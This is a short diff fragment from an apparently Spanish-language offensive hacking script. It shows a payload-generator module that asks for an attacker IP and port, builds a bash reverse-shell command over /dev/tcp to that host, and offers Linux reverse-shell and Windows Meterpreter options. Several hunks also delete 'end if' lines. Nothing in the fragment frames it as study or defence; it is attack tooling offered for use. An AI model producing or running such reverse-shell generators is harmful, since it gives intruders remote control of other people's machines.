 shell_generado = "bash -i >& /dev/tcp/" + ip_atacante + "/" + puerto + " 0>&1"
@@ -1883,10 +1733,8 @@ end function
 modulo_payloads_generar = function()
 ip_atacante = __nini_pedir("LHOST (tu IP): ")
 if (ip_atacante == "") then; ip_atacante = "127.0.0.1"
-end if
 puerto = __nini_pedir("LPORT: ")
 if (puerto == "") then; puerto = "4444"
-end if
 opciones_payload = [
 {"label": "Linux Shell", "cmd": "linux"},
 {"label": "Windows Meterpreter", "cmd": "windows"},
@@ -1894,7 +1742,6 @@ opciones_payload = [
 ]
 tipo_payload = menu_interactivo("GENERADOR DE PAYLOADS", opciones_payload)
 if (not tipo_payload) then; return
-end if
 payload_info = ""
 if (tipo_payload == "linux") then
 payload_info = "linux/x86/shell_reverse_tcp"
